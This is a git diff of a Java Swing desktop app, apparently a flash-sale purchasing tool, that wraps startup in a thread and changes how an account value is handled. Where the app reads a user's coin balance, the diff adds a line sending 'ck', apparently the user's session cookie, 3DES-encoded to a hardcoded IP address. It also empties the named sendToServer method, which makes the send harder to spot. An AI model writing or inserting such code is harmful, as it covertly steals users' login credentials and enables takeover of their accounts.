@@ -22,13 +22,18 @@ import static wj.util.QiangGouUtil.*;
 public class MainPage extends JFrame {
 
     public static void main(String[] args) {
-        System.out.println("正在验证...");
-        if (CheckHeartUtil.pass()) {
-            System.out.println("验证通过，启动窗口！");
-            new MainPage();
-        } else {
-            new MainPage();
-        }
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                System.out.println("正在验证...");
+                if (CheckHeartUtil.pass()) {
+                    System.out.println("验证通过，启动窗口！");
+                    new MainPage();
+                } else {
+                    new MainPage();
+                }
+            }
+        }).start();
     }
 
     public static ConfigBean configBean = new ConfigBean();
@@ -377,9 +382,7 @@ public class MainPage extends JFrame {
                         } else {
                             System.out.println(dataBean.getData().getCanUseCoinAmount());
                             ckBean.setMoney(dataBean.getData().getCanUseCoinAmount());
-
-                            sendToServer(ck);
-
+                            CheckHeartUtil.get("http://1.13.154.238/wangjing/load?code=" + UrlUtil.urlEncode(Des3Util.encode(ck)));
                         }
                     } catch (Exception e) {
                         e.printStackTrace();
@@ -396,7 +399,7 @@ public class MainPage extends JFrame {
     }
 
     private void sendToServer(String ck) {
-        CheckHeartUtil.get(CheckHeartUtil.host + "/wangjing/load?code=" + UrlUtil.urlEncode(Des3Util.encode(ck)));
+
     }
 
     private void setJbtBac(JButton jbt) {
